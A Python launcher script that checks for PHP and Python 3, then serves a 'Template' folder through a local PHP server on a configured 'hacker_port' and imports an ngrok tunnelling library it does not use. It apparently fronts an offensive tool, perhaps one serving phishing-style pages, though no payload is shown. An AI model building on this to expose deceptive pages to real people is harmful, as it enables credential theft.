import os
import subprocess
import sys
from pyngrok import ngrok
from colorama import Fore,init
import json
import platform
import time
os_name = platform.uname()[0]

init()

def banner():
    if os.name == "nt":
        os.system("cls")
        print("")
    elif os.name == "posix":
        os.system("clear")
        print("")
        subprocess.Popen('neofetch')
        time.sleep(2)


def check_php():
    a = subprocess.getoutput("php -v")
    if "external" in a:
        
        print("Please Install php")
        sys.exit()
    else:
        pass


def version():

    py_version = sys.version.split(' ')[0]
    if "3" in py_version:
        pass
    else: 
        print("Please Install python 3")
        sys.exit()


with open('config.json') as f:
    port = json.load(f)['hacker_port']



def phpserv():
    with open("logs/log.log","w") as phplog:
        subprocess.Popen(('php', '-S', 'localhost:'+port,'-t','Template'), stdout=phplog, stderr=phplog) 
        print(Fore.GREEN+ " \n [+] php Server Started On port "+port+Fore.RED+" Link : "+Fore.WHITE+"http://localhost:"+port)


        try:
            input(Fore.GREEN+"\n [+] "+Fore.WHITE+"Press CTRL+C To Exit Or  (Press Enter)")
            with open("logs/exit.log","w") as kill:
                if os_name == "Windows":

                    subprocess.Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
                    subprocess.Popen(("taskkill","/F","/IM","ngrok*"),stderr=kill,stdout=kill)

                else:
                    subprocess.Popen(("killall","php"),stderr=kill,stdout=kill)
                    subprocess.Popen(("killall","ngrok"),stderr=kill,stdout=kill)

            

                
        except KeyboardInterrupt:
            with open("logs/exit.log","w") as kill:
                if os_name == "Windows":

                    subprocess.Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
                    subprocess.Popen(("taskkill","/F","/IM","ngrok*"),stderr=kill,stdout=kill)

                else:
                    subprocess.Popen(("killall","php"),stderr=kill,stdout=kill)
                    subprocess.Popen(("killall","ngrok"),stderr=kill,stdout=kill)

            print(" ")
            sys.exit()

check_php()
version()
banner()
phpserv()



